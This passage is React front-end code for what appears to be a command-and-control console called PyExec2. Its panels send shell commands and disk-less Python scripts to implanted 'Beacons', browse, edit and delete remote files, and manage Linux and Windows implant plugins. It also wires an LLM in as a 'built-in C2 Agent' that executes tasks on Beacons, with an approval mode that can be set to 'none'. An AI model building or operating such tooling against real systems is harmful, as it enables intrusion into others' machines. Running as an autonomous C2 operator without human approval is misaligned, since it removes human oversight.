            <div className="cmd-input"><span>λ</span><input value={input} placeholder="输入命令，如 ls /tmp、ps、exec id、cd /tmp、proxy start 1080" onChange={e => { setInput(e.target.value); setShowSuggest(true); setHistoryIndex(-1) }} onKeyDown={e => { if (e.key === 'Enter') { runCommand(); setHistoryIndex(-1) } if (e.key === 'ArrowUp') { e.preventDefault(); const next = Math.min(history.length - 1, historyIndex + 1); if (history[next] !== undefined) { setHistoryIndex(next); setInput(history[next]) } } if (e.key === 'ArrowDown') { e.preventDefault(); const next = Math.max(-1, historyIndex - 1); setHistoryIndex(next); setInput(next >= 0 ? history[next] : '') } if (e.key === 'Tab' && suggestions[0]) { e.preventDefault(); setInput(suggestions[0] + ' ') } }} /><button className="primary" onClick={() => runCommand()} disabled={busy}>执行</button><button className="ghost danger" onClick={stopQueue} disabled={stopBusy}>急停</button></div>
            <div className="hint">Tab 补全 · ↑/↓ 本地命令历史 · 支持连续下发并行任务{parallelTaskCount > 0 ? ` · 并行执行中 ${parallelTaskCount}` : ''} · 正则筛选仅影响显示{queueMsg && <span className="queue-stop-msg"> · {queueMsg}</span>}</div>
          </div>
        </Panel>
        <Panel title="Python 脚本下发" eyebrow="LOCAL PYTHON CLIENT" right={<span className="micro">脚本不落目标磁盘</span>} className="python-panel">
          <div className="script-toolbar"><input value={pyName} onChange={e => setPyName(e.target.value)} placeholder="模板名称" /><select value={templateName} onChange={e => { setTemplateName(e.target.value); if (e.target.value) applyTemplate(e.target.value) }}><option value="">选择本地模板</option>{templates.map(item => <option key={item.name} value={item.name}>{item.name}</option>)}</select><button className="ghost" onClick={deleteTemplate} disabled={!templateName}>删除模板</button></div>
          <PythonEditor value={pyScript} onChange={setPyScript} className="python-editor-syntax" height="280px" />
          <div className="modal-actions"><button className="ghost" onClick={savePythonTemplate}>保存为本地模板</button><button className="primary" onClick={sendPython} disabled={busy}>下发 Python 脚本</button></div>
          {templateMsg && <div className="hint">{templateMsg}</div>}
        </Panel>
      </div>
      <div className="command-side">
        <Panel title="快速操作" eyebrow="ALL COMMANDS" className="quick-panel" right={<span className="micro">{filteredQuickItems.length} CMDS</span>}>
          <div className="quick-search"><input value={quickSearch} onChange={e => setQuickSearch(e.target.value)} placeholder="搜索命令 / 功能，例如：文件、进程、端口、killtask…" /></div>
          <div className="quick-all-list">{filteredQuickItems.map(item => <button key={`${item.moduleLabel}:${item.label}`} className="quick-all-row" onClick={() => openQuick(item)}><span className="quick-category">{item.moduleLabel}</span><strong>{item.label}</strong><code>{item.command}</code></button>)}{!filteredQuickItems.length && <div className="empty">没有匹配的快速操作</div>}</div>
        </Panel>
        <Panel title="命令历史" eyebrow="LOCAL FILE HISTORY" className="history-panel" right={<button className="ghost" onClick={clearHistory}>清空</button>}>
          <div className="history-list">{visibleHistory.map(item => <div className="history-row" key={item.id}><button className="history-select" onClick={() => { setInput(item.command); setTab('terminal') }}><span>{item.ts?.slice(5, 16)}</span><code>{item.command}</code><small>{item.kind}</small></button><button className="history-replay" onClick={() => runCommand(item.command)} disabled={busy}>↻ 再次下发</button></div>)}{!visibleHistory.length && <div className="empty">暂无本地历史</div>}</div>
          <div className="hint">历史保存在本地客户端：<code>clients/local_data/history/</code>，每条命令一个 JSON 文件。</div>
        </Panel>
      </div>
    </div> : tab === 'files' ? <>
      <div className="file-edit-workspace">
      <Panel title="文件浏览器" eyebrow="DIRECTORY" className="file-panel" right={<div className="quick-buttons"><button className="ghost" onClick={openCreateFile} disabled={busy}>＋ 新建文件</button><label className="file-upload">上传<input type="file" onChange={e => { const file = e.target.files?.[0]; e.target.value = ''; uploadToTarget(file) }} /></label><button className="ghost danger" onClick={openDeleteFile} disabled={!selectedFile?.path || busy}>删除</button><button className="ghost" onClick={() => loadDir(path)} disabled={busy}>刷新</button></div>}>
        <div className="path-row"><button className="ghost" onClick={() => loadDir(path === '/' ? '/' : path.split('/').slice(0, -1).join('/') || '/')}>↑</button><input value={path} onChange={e => setPath(e.target.value)} onKeyDown={e => e.key === 'Enter' && loadDir(path)} /><button className="ghost" onClick={() => loadDir(path)}>打开</button></div>
        <div className="file-list-head"><span></span><span>权限</span><span>用户</span><span>用户组</span><span>名称</span><span>大小</span><span>修改时间</span></div>
        <div className="file-list">{entries.map(entry => <button key={entry.path || entry.name} className={`file-row ${selectedFile?.path === entry.path ? 'active' : ''}`} onClick={() => openFile(entry)}><span>{entry.kind === 'dir' ? '▸' : '·'}</span><span className="file-mode">{entry.mode || '—'}</span><span className="file-owner">{entry.owner ?? entry.uid ?? '—'}</span><span className="file-group">{entry.group ?? entry.gid ?? '—'}</span><span className="file-name">{entry.name}</span><span className="file-size">{entry.kind === 'dir' ? 'DIR' : `${entry.size} B`}</span><span className="file-time">{entry.mtime?.slice(5, 16) || '—'}</span></button>)}{!entries.length && <div className="empty">目录为空或尚未加载</div>}</div>
        {fileMsg && <div className="hint">{fileMsg}</div>}
      </Panel>
      <Panel title={selectedFile ? selectedFile.path : '文件查看 / 编辑'} eyebrow="FILE EDITOR" className="file-editor-panel" right={selectedFile ? <div className="quick-buttons"><button className={fileMode === 'view' ? 'primary' : 'ghost'} onClick={() => setFileMode('view')}>查看</button><button className={fileMode === 'edit' ? 'primary' : 'ghost'} onClick={() => setFileMode('edit')} disabled={selectedFile.binary}>编辑</button><button className="ghost" onClick={downloadSelected} disabled={!selectedFile.path || busy}>下载</button></div> : null}>
        {selectedFile ? <>
          <div className="file-meta"><span>{selectedFile.binary ? 'BINARY' : 'TEXT'}</span><span>{selectedFile.text?.length || 0} chars</span>{fileMode === 'edit' && <span className="warn">编辑模式</span>}</div>
          {fileMode === 'edit' ? <textarea className="file-editor" value={fileEdit} onChange={e => setFileEdit(e.target.value)} spellCheck={false} /> : <pre className="file-viewer">{selectedFile.binary ? `[binary]\n${(selectedFile.content_b64 || '').slice(0, 4000)}` : selectedFile.text}</pre>}
          {fileMode === 'edit' && <div className="modal-actions"><button className="ghost" onClick={() => { setFileEdit(selectedFile.text); setFileMode('view') }}>取消</button><button className="primary" onClick={saveSelectedFile} disabled={busy}>保存到目标</button></div>}
        </> : <div className="empty">在左侧选择文件查看或编辑。</div>}
        {fileMsg && <div className="hint">{fileMsg}</div>}
      </Panel>
      </div>
      {deleteFileOpen && <div className="modal-back"><div className="modal file-delete-modal"><div className="modal-head"><div><div className="eyebrow">DELETE REMOTE FILE</div><h2>删除文件</h2><p className="micro">删除后不可恢复，请确认目标路径。</p></div><button className="ghost" onClick={() => setDeleteFileOpen(false)} disabled={deleteFileBusy}>关闭</button></div><div className="file-delete-body"><span>目标路径</span><code>{selectedFile?.path || '—'}</code><p className="caution">该操作会直接在当前 Beacon 上删除目标文件。</p></div><div className="modal-actions"><button className="ghost" onClick={() => setDeleteFileOpen(false)} disabled={deleteFileBusy}>取消</button><button className="ghost danger" onClick={deleteSelectedFile} disabled={deleteFileBusy}>{deleteFileBusy ? '删除中…' : '确认删除'}</button></div></div></div>}
      {createFileOpen && <div className="modal-back"><div className="modal file-create-modal"><div className="modal-head"><div><div className="eyebrow">CREATE REMOTE FILE</div><h2>新建文件</h2><p className="micro">在指定目录创建文本文件；同名文件会被覆盖。</p></div><button className="ghost" onClick={() => setCreateFileOpen(false)} disabled={createFileBusy}>关闭</button></div><div className="file-create-body"><label>目标目录 / 路径<input value={createFileDir} onChange={e => setCreateFileDir(e.target.value)} placeholder="例如 /tmp 或 ." /></label><label>文件名<input value={createFileName} onChange={e => setCreateFileName(e.target.value)} placeholder="例如 hello.txt" autoFocus /></label><div className="file-create-preview"><span>完整路径</span><code>{(() => { const dir = (createFileDir.trim() || '.').replace(/\/+$/, ''); const name = createFileName.trim().replace(/^\/+/, ''); return dir === '/' ? `/${name}` : `${dir}/${name}` })()}</code></div><label>文件内容<textarea className="file-create-content" value={createFileContent} onChange={e => setCreateFileContent(e.target.value)} placeholder="输入新文件内容…" spellCheck={false} /></label></div><div className="modal-actions"><button className="ghost" onClick={() => setCreateFileOpen(false)} disabled={createFileBusy}>取消</button><button className="primary" onClick={createTargetFile} disabled={createFileBusy || !createFileName.trim()}>{createFileBusy ? '创建中…' : '创建并写入'}</button></div></div></div>}
    </> : <div className="beacon-control-page">{controlPanel}</div>}
    {quickDialog && <div className="modal-back"><div className="modal quick-action-modal"><div className="modal-head"><div><div className="eyebrow">QUICK COMMAND / {quickDialog.command}</div><h2>{quickDialog.label}</h2><p className="dim">{quickDialog.description}</p></div><button className="ghost" onClick={() => setQuickDialog(null)}>关闭</button></div>
      <div className="quick-modal-body">
        {quickDialog.params?.length > 0 ? <div className="quick-param-list">{quickDialog.params.map(param => <label key={param.key}><div className="quick-param-label"><span>{param.label}</span><small>{param.hint}</small></div><input type={param.type || 'text'} value={quickValues[param.key] ?? ''} onChange={e => setQuickValues(prev => ({ ...prev, [param.key]: e.target.value }))} autoFocus={quickDialog.params[0]?.key === param.key} /></label>)}</div> : <div className="quick-no-params">该命令不需要参数，点击执行后将发送到当前 Beacon 命令窗口。</div>}
        <div className="quick-command-preview"><span>即将下发</span><code>{quickCommand}</code></div>
      </div>
      <div className="modal-actions"><button className="ghost" onClick={() => setQuickDialog(null)}>取消</button><button className="primary" onClick={executeQuick} disabled={busy}>执行并发送到命令窗口</button></div>
    </div></div>}
  </div>
}

function Plugins({ plugins, refresh }) {
  const [category, setCategory] = useState('linux')
  const [serverKind, setServerKind] = useState('server')
  const [selected, setSelected] = useState(null)
  const [source, setSource] = useState('')
  const [name, setName] = useState('')
  const [msg, setMsg] = useState('')
  const [createMode, setCreateMode] = useState('')
  const [newName, setNewName] = useState('')
  const [newCommand, setNewCommand] = useState('')
  const [createMsg, setCreateMsg] = useState('')
  const serverPlugins = plugins.filter(p => p.kind === 'server')
  const transportPlugins = plugins.filter(p => p.kind === 'transport')
  const list = category === 'server' ? [...serverPlugins, ...transportPlugins] : plugins.filter(p => p.kind === 'implant' && p.platform === category)
  const linuxCount = plugins.filter(p => p.kind === 'implant' && p.platform === 'linux').length
  const windowsCount = plugins.filter(p => p.kind === 'implant' && p.platform === 'windows').length
  const serverCount = serverPlugins.length
  const transportCount = transportPlugins.length
  const openByName = async (targetKind, targetName) => {
    const data = await action('plugin.show', { kind: targetKind, name: targetName })
    setSelected({ kind: targetKind, name: targetName }); setSource(data.source); setName(targetName); setMsg('')
  }
  const open = async (p) => openByName(p.kind, p.name)
  const save = async () => {
    try {
      await action('plugin.save', { kind: selected.kind, name, source })
      if (selected.name !== name) await action('plugin.delete', { kind: selected.kind, name: selected.name })
      setSelected({ kind: selected.kind, name })
      setMsg('已保存并热重载')
      await refresh()
    } catch (err) { setMsg(err.message) }
  }
  const switchCategory = (nextCategory) => {
    setCategory(nextCategory); setSelected(null); setSource(''); setName(''); setMsg('')
  }
  const startCreate = (mode) => {
    setCreateMode(mode); setNewName(''); setNewCommand(''); setCreateMsg('')
  }
  const createManual = async () => {
    if (!newName.trim()) { setCreateMsg('请输入插件名称'); return }
    const pluginKind = category === 'server' ? serverKind : 'implant'
    const prefix = category === 'linux' ? 'l' : category === 'windows' ? 'w' : ''
    let pluginName = newName.trim()
    if (pluginKind === 'implant' && !pluginName.includes('/')) pluginName = `${category}/${pluginName}`
    let command = newCommand.trim()
    if (pluginKind === 'implant' && command && !command.startsWith(prefix)) command = prefix + command
    try {
      const data = await action('plugin.create', { kind: pluginKind, name: pluginName, command, platform: category === 'server' ? 'all' : category })
      setCreateMode(''); setCreateMsg(''); await refresh(); await openByName(pluginKind, data.name)
      setMsg(`已创建 ${category === 'server' ? '服务端' : category === 'linux' ? 'Linux' : 'Windows'} 插件：${data.name}`)
    } catch (err) { setCreateMsg(err.message) }
  }
  return <div className="page">
    <header className="page-head"><div><div className="eyebrow">PLUGIN STUDIO</div><h1>插件</h1><p>Linux / Windows 植入插件分区管理；服务端与传输插件统一在服务端分类中展示，支持人工创建、编辑和热重载。</p></div><button className="ghost" onClick={refresh}>刷新目录</button></header>
    {msg && <Banner text={msg} />}
    <div className="plugin-layout">
      <Panel title="插件目录" eyebrow="CATALOG">
        <div className="plugin-kind-tabs platform-tabs">
          <button className={`plugin-kind-tab ${category === 'linux' ? 'active' : ''}`} onClick={() => switchCategory('linux')}><span>Linux 插件</span><small>{linuxCount}</small></button>
          <button className={`plugin-kind-tab ${category === 'windows' ? 'active' : ''}`} onClick={() => switchCategory('windows')}><span>Windows 插件</span><small>{windowsCount}</small></button>
          <button className={`plugin-kind-tab server-tab ${category === 'server' ? 'active' : ''}`} onClick={() => switchCategory('server')}><span>服务端 / 传输</span><small>{serverCount + transportCount}</small></button>
        </div>
        <div className="plugin-actions">
          <button className="primary" onClick={() => startCreate('manual')}>＋ 新建插件</button>
        </div>
        <div className="plugin-category-note">{category === 'linux' ? '仅显示 Linux 植入插件' : category === 'windows' ? '仅显示 Windows 植入插件' : `服务端 ${serverCount} 个 · 传输 ${transportCount} 个`} · 共 {list.length} 个</div>
        <div className="plugin-list">{list.map(p => <button key={`${p.kind}:${p.name}`} className={`plugin-row ${selected?.name === p.name && selected?.kind === p.kind ? 'active' : ''}`} onClick={() => open(p)}><span className="plugin-kind">{p.kind === 'server' ? '服务端' : p.kind === 'transport' ? '传输' : p.platform === 'linux' ? 'Linux' : p.platform === 'windows' ? 'Windows' : '植入'}</span><strong>{p.display_name || p.name}</strong><code>{p.commands?.join(', ') || p.name}</code>{p.error && <small className="error">{p.error}</small>}</button>)}{!list.length && <div className="empty">当前分类暂无插件</div>}</div>
      </Panel>
      <Panel title={selected ? `${selected.kind} / ${selected.name}` : '插件源码'} eyebrow="EDITOR">{selected ? <><input className="plugin-name" value={name} onChange={e => setName(e.target.value)} /><PythonEditor value={source} onChange={setSource} className="plugin-editor-syntax" height="600px" /><div className="modal-actions"><button className="ghost" onClick={() => open(selected)}>还原</button><button className="primary" onClick={save}>保存并热重载</button></div></> : <div className="empty">选择左侧插件查看源码，或点击“新建插件”。</div>}</Panel>
    </div>
    {createMode && <div className="modal-back"><div className="modal plugin-create-modal"><div className="modal-head"><div><div className="eyebrow">PLUGIN TEMPLATE</div><h2>新建{category === 'linux' ? 'Linux 插件' : category === 'windows' ? 'Windows 插件' : serverKind === 'transport' ? '传输插件' : '服务端插件'}</h2></div><button className="ghost" onClick={() => setCreateMode('')}>关闭</button></div>
      <div className="create-form">
        {category === 'server' && <label><span>插件类型</span><select value={serverKind} onChange={e => setServerKind(e.target.value)}><option value="server">服务端插件</option><option value="transport">传输插件</option></select></label>}
        <label><span>插件名称</span><input value={newName} onChange={e => setNewName(e.target.value)} placeholder={category === 'server' ? (serverKind === 'transport' ? '例如 my_transport' : '例如 my_server_plugin') : '例如 my_command'} /></label>
        <label><span>基础命令名（可选，自动加 l/w 前缀）</span><input value={newCommand} onChange={e => setNewCommand(e.target.value)} placeholder={category === 'server' ? '例如 server.my_command' : '例如 cd'} /></label>
        {createMsg && <div className="create-msg">{createMsg}</div>}
        <div className="modal-actions"><button className="ghost" onClick={() => setCreateMode('')}>取消</button><button className="primary" onClick={createManual}>创建模板并打开</button></div>
      </div>
    </div></div>}
  </div>
}

const AI_GUIDE_DEFAULT = {
  SERVER_URL: 'http://127.0.0.1:18080', SERVER_SCHEME: 'http', SERVER_HOST: '127.0.0.1', SERVER_PORT: '18080',
  LOCAL_WEB_URL: 'http://127.0.0.1:8765', PROJECT_DIR: '.', AI_CLIENT: 'clients/ai/client_ai.py',
  HUMAN_TOKEN: '<Human Token>', AI_WORKER_TOKEN: '<AI Worker Token>', AI_APPROVAL_TOKEN: '<AI Approval Token>',
}

const AI_GUIDE_CONTEXT_FIELDS = [
  ['server_url', '服务端控制 API', 'http://127.0.0.1:18080'],
  ['local_web_url', '本地 Web 客户端', 'http://127.0.0.1:8765'],
  ['project_dir', '项目目录', '客户端自动获取，获取不到时手填'],
  ['ai_client', 'AI 客户端路径', 'clients/ai/client_ai.py'],
  ['human_token', 'Human Token', '填写 Human Token'],
  ['ai_worker_token', 'AI Worker Token', '填写 AI Worker Token'],
  ['ai_approval_token', 'AI Approval Token', '填写 AI Approval Token'],
]

function loadGuideOverrides() {
  try { return JSON.parse(localStorage.getItem('pyexec_ai_guide_context') || '{}') || {} } catch { return {} }
}

function renderAIGuide(template, context) {
  const values = { ...AI_GUIDE_DEFAULT }
  for (const [key, value] of Object.entries(context || {})) values[key.toUpperCase()] = String(value ?? '')
  return String(template || AI_GUIDE_TEXT).replace(/\{\{([A-Z0-9_]+)\}\}/g, (match, key) => values[key] ?? match)
}

function AIGuide() {
  const [context, setContext] = useState(null)
  const [overrides, setOverrides] = useState(loadGuideOverrides)
  const [loadMsg, setLoadMsg] = useState('')
  const [template, setTemplate] = useState(() => localStorage.getItem('pyexec_ai_guide_template') || AI_GUIDE_TEXT)
  const [draft, setDraft] = useState(template)
  const [editing, setEditing] = useState(false)
  const [markdownMode, setMarkdownMode] = useState(true)
  const [saveMsg, setSaveMsg] = useState('')
  useEffect(() => {
    fetch('/api/ai-guide-context', { headers: { 'X-PyExec-Auth': sessionStorage.getItem('pyexec_token') || '' } })
      .then(r => { if (!r.ok) throw new Error(`HTTP ${r.status}`); return r.json() })
      .then(setContext)
      .catch(err => setLoadMsg(err.message))
  }, [])
  const mergedContext = useMemo(() => {
    const merged = { ...AI_GUIDE_DEFAULT, ...(context || {}), ...overrides }
    try {
      const url = new URL(String(merged.server_url || merged.SERVER_URL || ''))
      merged.server_scheme = url.protocol.replace(':', '') || merged.server_scheme
      merged.server_host = url.hostname || merged.server_host
      merged.server_port = url.port || (url.protocol === 'https:' ? '443' : '80')
    } catch { /* keep manually provided values */ }
    return merged
  }, [context, overrides])
  const text = useMemo(() => renderAIGuide(template, mergedContext), [template, mergedContext])
  const markdownText = useMemo(() => text.replace(/^([一二三四五六七八九十]+、.*)$/gm, '## $1'), [text])
  const updateGuideContext = (key, value) => {
    const next = { ...overrides, [key]: value }
    setOverrides(next)
    localStorage.setItem('pyexec_ai_guide_context', JSON.stringify(next))
  }
  const guideValue = (key) => String(overrides[key] ?? context?.[key] ?? AI_GUIDE_DEFAULT[key.toUpperCase()] ?? '')
  const clearGuideOverrides = () => { setOverrides({}); localStorage.removeItem('pyexec_ai_guide_context'); setSaveMsg('已清空手填动态值，重新使用客户端自动获取值') }
  const startEdit = () => { setDraft(template); setEditing(true); setMarkdownMode(false); setSaveMsg('') }
  const saveEdit = () => { setTemplate(draft); localStorage.setItem('pyexec_ai_guide_template', draft); setEditing(false); setSaveMsg('教程模板已保存') }
  const cancelEdit = () => { setDraft(template); setEditing(false) }
  const resetTemplate = () => { setDraft(AI_GUIDE_TEXT); setTemplate(AI_GUIDE_TEXT); localStorage.removeItem('pyexec_ai_guide_template'); setSaveMsg('已恢复默认教程') }
  return <div className="page ai-guide-page">
    <header className="page-head"><div><div className="eyebrow">AI INTEGRATION MANUAL</div><h1>AI 教程<span>_</span></h1><p>自动填入当前服务端地址、端口和三类 Token；编辑时显示可替换占位符，保存后自动替换成真实值。</p>{loadMsg && <span className="hint">动态上下文加载失败：{loadMsg}</span>}{saveMsg && <span className="hint">{saveMsg}</span>}</div>
      <div className="ai-guide-actions">{editing ? <><button className="ghost" onClick={resetTemplate}>恢复默认</button><button className="ghost" onClick={cancelEdit}>取消</button><button className="primary" onClick={saveEdit}>保存教程</button></> : <><button className="ghost" onClick={() => setMarkdownMode(prev => !prev)}>{markdownMode ? '显示原文' : 'Markdown 渲染'}</button><button className="ghost" onClick={startEdit}>编辑教程</button><CopyButton text={text}>复制 AI 教程</CopyButton></>}</div>
    </header>
    <Panel title="动态上下文" eyebrow="AUTO FILL / MANUAL OVERRIDE" right={<button className="ghost" onClick={clearGuideOverrides}>清空手填值</button>}>
      <div className="ai-guide-context-panel">
        <div className="ai-guide-context-hint">客户端能获取的字段会自动填入；获取不到的值请在这里手填。修改后教程会实时重新渲染，并保存到本机浏览器。</div>
        <div className="ai-guide-context-grid">
          {AI_GUIDE_CONTEXT_FIELDS.map(([key, label, placeholder]) => <label key={key}><span>{label}</span><input value={guideValue(key)} onChange={e => updateGuideContext(key, e.target.value)} placeholder={placeholder} autoComplete="off" spellCheck={false} /></label>)}
        </div>
      </div>
    </Panel>
    <Panel title={editing ? 'AI 对接手册（编辑模板）' : 'AI 对接手册'} eyebrow={editing ? 'TEMPLATE EDITOR / PLACEHOLDERS' : 'COPY-READY PROMPT / DYNAMIC CONTEXT'}>
      {editing ? <><textarea className="ai-guide-editor" value={draft} onChange={e => setDraft(e.target.value)} spellCheck={false} /><div className="ai-guide-placeholder-hint">{`编辑模式只显示原文和占位符：{{SERVER_URL}} {{SERVER_SCHEME}} {{SERVER_HOST}} {{SERVER_PORT}} {{LOCAL_WEB_URL}} {{PROJECT_DIR}} {{AI_CLIENT}} {{HUMAN_TOKEN}} {{AI_WORKER_TOKEN}} {{AI_APPROVAL_TOKEN}}。保存后自动替换。`}</div></> : markdownMode ? <div className="ai-guide-markdown"><ReactMarkdown remarkPlugins={[remarkGfm, remarkBreaks]} components={{ a: ({ node, ...props }) => <a {...props} target="_blank" rel="noreferrer" /> }}>{markdownText}</ReactMarkdown></div> : <pre className="ai-guide-text">{text}</pre>}
    </Panel>
  </div>
}


const AGENT_WELCOME = { role: 'assistant', content: 'AI Agent 已就绪。我可以调用 PyExec2 的 Action 查看 Beacon、执行任务、处理分片文件、管理分组和执行审批。' }

function AIAgent({ onOpenApprovals }) {
  const [config, setConfig] = useState(null)
  const [memory, setMemory] = useState([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState('')
  const [baseUrl, setBaseUrl] = useState('https://api.deepseek.com')
  const [apiKey, setApiKey] = useState('')
  const [model, setModel] = useState('deepseek-flash')
  const [thinking, setThinking] = useState('max')
  const [rolePrompt, setRolePrompt] = useState('你是 PyExec2 的内置 C2 Agent。优先使用只读操作确认状态；执行写操作前说明目的；以实际工具返回结果为准，不要编造。')
  const [compatMode, setCompatMode] = useState('openai')
  const [models, setModels] = useState([])
  const [modelBusy, setModelBusy] = useState(false)
  const [testBusy, setTestBusy] = useState(false)
  const [testResult, setTestResult] = useState(null)
  const [chatMarkdown, setChatMarkdown] = useState(true)
  const [approvalMode, setApprovalMode] = useState('ai')
  const [queue, setQueue] = useState([])
  const [pendingApproval, setPendingApproval] = useState(null)
  const [serverApprovalWait, setServerApprovalWait] = useState(null)
  const [liveStatus, setLiveStatus] = useState('')
  const [liveEvents, setLiveEvents] = useState([])
  const queueRef = useRef([])
  const busyRef = useRef(false)
  const runSeqRef = useRef(0)
  const currentRunIdRef = useRef('')
  const abortRef = useRef(null)
  const messagesRef = useRef([])
  const chatLogRef = useRef(null)
  const traceRef = useRef(null)
  const chatFollowRef = useRef(true)
  const traceFollowRef = useRef(true)
  const chatLastTopRef = useRef(0)
  const traceLastTopRef = useRef(0)
  const [memoryModalOpen, setMemoryModalOpen] = useState(false)
  const [memoryModalItem, setMemoryModalItem] = useState(null)
  const [memoryTitle, setMemoryTitle] = useState('')
  const [memoryContent, setMemoryContent] = useState('')
  const [memoryBusy, setMemoryBusy] = useState(false)
  const [messages, setMessages] = useState([AGENT_WELCOME])
  const [input, setInput] = useState('')
  const [busy, setBusy] = useState(false)
  const [configMsg, setConfigMsg] = useState('')
  const [settingsOpen, setSettingsOpen] = useState(false)
  const [resetOpen, setResetOpen] = useState(false)
  const [resetBusy, setResetBusy] = useState(false)
  const [skillNotes, setSkillNotes] = useState([])
  const authHeaders = () => ({ 'X-PyExec-Auth': sessionStorage.getItem('pyexec_token') || '' })
  const localJson = async (url, options = {}) => {
    const res = await fetch(url, { ...options, headers: { ...authHeaders(), ...(options.headers || {}) } })
    const data = await res.json().catch(() => ({}))
    if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`)
    return data
  }
  const loadAgent = async () => {
    setLoading(true); setError(''); setConfig(null)
    try {
      // Config must load independently: a missing notebook/memory endpoint must
      // never send the user back to the API-key setup screen.
      const c = await localJson('/api/ai-agent/config')
      setConfig(c)
      setBaseUrl(c.base_url || 'https://api.deepseek.com'); setModel(c.model || 'deepseek-flash'); setThinking(c.thinking || 'max'); setCompatMode(c.compat_mode === 'claude' ? 'claude' : 'openai'); setApprovalMode(['human','ai','none'].includes(c.approval_mode) ? c.approval_mode : 'ai'); setRolePrompt(c.role_prompt || '')
      try { const m = await localJson('/api/ai-agent/memory'); setMemory(m.items || []) } catch { setMemory([]) }
      try { const n = await localJson('/api/notebooks'); setSkillNotes((n.items || []).filter(item => item.category === 'redteam')) } catch { setSkillNotes([]) }
    } catch (err) { setError(err.message); setConfig(null) } finally { setLoading(false) }
  }
  useEffect(() => { loadAgent() }, [])
  useEffect(() => { messagesRef.current = messages }, [messages])
  const appendChatMessage = (message) => { const next = [...messagesRef.current, message]; messagesRef.current = next; setMessages(next) }
  const isNearBottom = (element, threshold = 24) => !!element && element.scrollHeight - element.scrollTop - element.clientHeight <= threshold
  const updateFollowState = (event, followRef, lastTopRef) => {
    const element = event.currentTarget
    const top = element.scrollTop
    if (top < lastTopRef.current - 1) followRef.current = false
    else if (isNearBottom(element)) followRef.current = true
    lastTopRef.current = top
  }
  const onChatScroll = (event) => updateFollowState(event, chatFollowRef, chatLastTopRef)
  const onTraceScroll = (event) => updateFollowState(event, traceFollowRef, traceLastTopRef)
  useEffect(() => {
    const element = chatLogRef.current
    if (!element || !chatFollowRef.current) return
    requestAnimationFrame(() => { if (chatFollowRef.current) element.scrollTop = element.scrollHeight })
  }, [messages, liveStatus, busy])
  useEffect(() => {
    const element = traceRef.current
    if (!element || !traceFollowRef.current) return
    requestAnimationFrame(() => { if (traceFollowRef.current) element.scrollTop = element.scrollHeight })
  }, [messages, liveEvents, liveStatus])
  const saveConfig = async () => {
    setConfigMsg('')
    try {
      const saved = await localJson('/api/ai-agent/config', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ base_url: baseUrl.trim() || 'https://api.deepseek.com', api_key: apiKey, model, thinking, compat_mode: compatMode, approval_mode: approvalMode, role_prompt: rolePrompt }) })
      setConfig(saved); setApiKey(''); setConfigMsg('设置已保存')
    } catch (err) { setConfigMsg(err.message) }
  }
  const fetchModels = async () => {
    if (!baseUrl.trim()) { setConfigMsg('请先填写 Base URL'); return }
    setModelBusy(true); setConfigMsg('')
    try {
      const data = await localJson('/api/ai-agent/models', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ base_url: baseUrl.trim(), api_key: apiKey, compat_mode: compatMode }) })
      const list = data.models || []
      setModels(list)
      if (list.length && !list.includes(model)) setModel(list[0])
      setConfigMsg(list.length ? `自动获取到 ${list.length} 个模型` : '接口没有返回模型列表')
    } catch (err) { setConfigMsg(err.message) } finally { setModelBusy(false) }
  }
  const testConnection = async () => {
    if (!baseUrl.trim()) { setConfigMsg('请先填写 Base URL'); return }
    setTestBusy(true); setTestResult(null); setConfigMsg('')
    try {
      const data = await localJson('/api/ai-agent/test', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ base_url: baseUrl.trim() || 'https://api.deepseek.com', api_key: apiKey, model, thinking, compat_mode: compatMode, approval_mode: approvalMode, role_prompt: rolePrompt }) })
      setTestResult(data)
      setConfigMsg(data.connected ? 'AI 真实回复验证通过' : 'AI 已回复，但没有回复“连接成功”')
    } catch (err) {
      setTestResult({ ok: false, connected: false, error: err.message })
      setConfigMsg(err.message)
    } finally { setTestBusy(false) }
  }
  const openMemoryModal = (item = null) => {
    setMemoryModalItem(item); setMemoryTitle(item?.title || ''); setMemoryContent(item?.content || ''); setMemoryModalOpen(true); setConfigMsg('')
  }
  const openMemoryManager = () => {
    const first = memory[0] || null
    openMemoryModal(first)
  }
  const newMemory = () => { setMemoryModalItem(null); setMemoryTitle(''); setMemoryContent(''); setConfigMsg('') }
  const saveMemoryModal = async () => {
    if (!memoryContent.trim()) { setConfigMsg('记忆内容不能为空'); return }
    setMemoryBusy(true); setConfigMsg('')
    try {
      const body = { title: memoryTitle.trim(), content: memoryContent.trim() }
      let savedItem
      if (memoryModalItem) {
        const saved = await localJson(`/api/ai-agent/memory/${memoryModalItem.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) })
        savedItem = saved.item
        setMemory(prev => prev.map(row => row.id === memoryModalItem.id ? savedItem : row))
      } else {
        const saved = await localJson('/api/ai-agent/memory', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) })
        savedItem = saved.item
        setMemory(prev => [...prev, savedItem].slice(-200))
      }
      setMemoryModalItem(savedItem); setMemoryTitle(savedItem.title || ''); setMemoryContent(savedItem.content || '')
      setConfigMsg(memoryModalItem ? '记忆已更新' : '记忆已添加')
    } catch (err) { setConfigMsg(err.message) } finally { setMemoryBusy(false) }
  }
  const deleteMemory = async (item) => {
    try {
      await localJson(`/api/ai-agent/memory/${item.id}`, { method: 'DELETE' })
      const remaining = memory.filter(row => row.id !== item.id)
      setMemory(remaining)
      if (memoryModalItem?.id === item.id) openMemoryModal(remaining[0] || null)
      setConfigMsg('记忆已删除')
    } catch (err) { setConfigMsg(err.message) }
  }
  const toggleSkill = async (note) => {
    try {
      const saved = await localJson(`/api/notebooks/${note.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ai_skill: !note.ai_skill }) })
      setSkillNotes(prev => prev.map(item => item.id === note.id ? saved.item : item))
      setConfigMsg(saved.item.ai_skill ? 'Skill 已启用' : 'Skill 已停用')
    } catch (err) { setConfigMsg(err.message) }
  }
  const resetConfig = async () => {
    setResetBusy(true); setConfigMsg('')
    try {
      const data = await localJson('/api/ai-agent/config/reset', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' })
